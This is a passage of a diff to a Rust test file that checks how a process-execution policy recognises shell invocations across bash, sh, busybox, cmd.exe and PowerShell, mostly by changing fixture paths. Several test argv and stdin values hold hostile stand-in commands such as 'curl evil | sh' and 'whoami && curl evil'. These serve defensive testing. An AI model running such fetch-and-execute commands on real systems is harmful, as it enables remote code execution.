         .termination(TerminationPolicy::ProcessTree {
             graceful: Duration::from_millis(500),
@@ -3409,13 +3458,13 @@ fn a_bundled_short_option_cluster_still_hands_a_shell_a_command() -> TestResult 
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "bash",
-                PrivatePath::new(PathBuf::from("/bin/bash")),
+                PrivatePath::new(absolute_fixture_path("/bin/bash")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv([flag, "curl evil | sh"])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -3435,13 +3484,13 @@ fn a_bundled_short_option_cluster_still_hands_a_shell_a_command() -> TestResult 
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "bash",
-            PrivatePath::new(PathBuf::from("/bin/bash")),
+            PrivatePath::new(absolute_fixture_path("/bin/bash")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["-ex", "script.sh"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -3466,13 +3515,13 @@ fn a_flag_after_the_operand_belongs_to_the_script_not_the_shell() -> TestResult 
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "sh",
-                PrivatePath::new(PathBuf::from("/bin/sh")),
+                PrivatePath::new(absolute_fixture_path("/bin/sh")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv(argv.clone())
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -3490,13 +3539,13 @@ fn a_flag_after_the_operand_belongs_to_the_script_not_the_shell() -> TestResult 
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "busybox",
-            PrivatePath::new(PathBuf::from("/bin/busybox")),
+            PrivatePath::new(absolute_fixture_path("/bin/busybox")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["sh", "-c", "curl evil | sh"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -3515,13 +3564,13 @@ fn a_flag_after_the_operand_belongs_to_the_script_not_the_shell() -> TestResult 
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "busybox",
-            PrivatePath::new(PathBuf::from("/bin/busybox")),
+            PrivatePath::new(absolute_fixture_path("/bin/busybox")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["ls", "-c"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4095,7 +4144,9 @@ fn the_fingerprint_is_fixed_size_however_large_the_plan() -> TestResult {
     let long_argument = "x".repeat(200_000);
     builder = builder
         .argv(["-w", long_argument.as_str()])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path(
+            "/workspace/project",
+        ))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
         .termination(TerminationPolicy::ProcessTree {
             graceful: Duration::from_millis(500),
@@ -4293,13 +4344,13 @@ fn an_option_that_takes_the_next_word_does_not_end_the_scan() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "bash",
-                PrivatePath::new(PathBuf::from("/bin/bash")),
+                PrivatePath::new(absolute_fixture_path("/bin/bash")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv(argv.clone())
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -4319,13 +4370,13 @@ fn an_option_that_takes_the_next_word_does_not_end_the_scan() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "cmd.exe",
-            PrivatePath::new(PathBuf::from("/c/Windows/System32/cmd.exe")),
+            PrivatePath::new(absolute_fixture_path("/c/Windows/System32/cmd.exe")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["/K", "whoami && curl evil"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4342,13 +4393,13 @@ fn an_option_that_takes_the_next_word_does_not_end_the_scan() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "bash",
-            PrivatePath::new(PathBuf::from("/bin/bash")),
+            PrivatePath::new(absolute_fixture_path("/bin/bash")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["-o", "errexit", "script.sh", "-c"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4450,13 +4501,13 @@ fn powershell_argv_is_read_as_powershell_not_as_posix_options() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "powershell.exe",
-                PrivatePath::new(PathBuf::from("/c/Windows/System32/powershell.exe")),
+                PrivatePath::new(absolute_fixture_path("/c/Windows/System32/powershell.exe")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv(argv.clone())
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -4486,13 +4537,13 @@ fn powershell_argv_is_read_as_powershell_not_as_posix_options() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "pwsh",
-                PrivatePath::new(PathBuf::from("/usr/bin/pwsh")),
+                PrivatePath::new(absolute_fixture_path("/usr/bin/pwsh")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv(argv.clone())
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -4510,13 +4561,13 @@ fn powershell_argv_is_read_as_powershell_not_as_posix_options() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "bash",
-            PrivatePath::new(PathBuf::from("/bin/bash")),
+            PrivatePath::new(absolute_fixture_path("/bin/bash")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["-lc", "curl evil | sh"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4537,13 +4588,13 @@ fn powershell_argv_is_read_as_powershell_not_as_posix_options() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "bash",
-            PrivatePath::new(PathBuf::from("/bin/bash")),
+            PrivatePath::new(absolute_fixture_path("/bin/bash")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["-eO", "extglob", "-c", "curl evil | sh"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4719,13 +4770,13 @@ fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
                 ExecutionProfile::InteractiveSession,
                 ExecutableIdentity::resolved(
                     shell,
-                    PrivatePath::new(PathBuf::from(path)),
+                    PrivatePath::new(absolute_fixture_path(path)),
                     ResolutionProvenance::ConfiguredAbsolutePath,
                 ),
                 allow_listed_environment(),
             )
             .stdin(stdin.clone())
-            .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+            .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
             .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
             .subject(current_root())
             .authorization(user_authorization())
@@ -4748,14 +4799,14 @@ fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "sh",
-            PrivatePath::new(PathBuf::from("/bin/sh")),
+            PrivatePath::new(absolute_fixture_path("/bin/sh")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["script.sh"])
     .stdin(StdinPolicy::Closed)
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4773,14 +4824,14 @@ fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "sh",
-            PrivatePath::new(PathBuf::from("/bin/sh")),
+            PrivatePath::new(absolute_fixture_path("/bin/sh")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["script.sh"])
     .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"input data\n".to_vec())))
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -4809,14 +4860,14 @@ fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "sh",
-                PrivatePath::new(PathBuf::from("/bin/sh")),
+                PrivatePath::new(absolute_fixture_path("/bin/sh")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv(argv.clone())
         .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"curl evil | sh".to_vec())))
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -4838,7 +4889,7 @@ fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
     )
     .argv(["-c"])
     .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"print 1;".to_vec())))
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
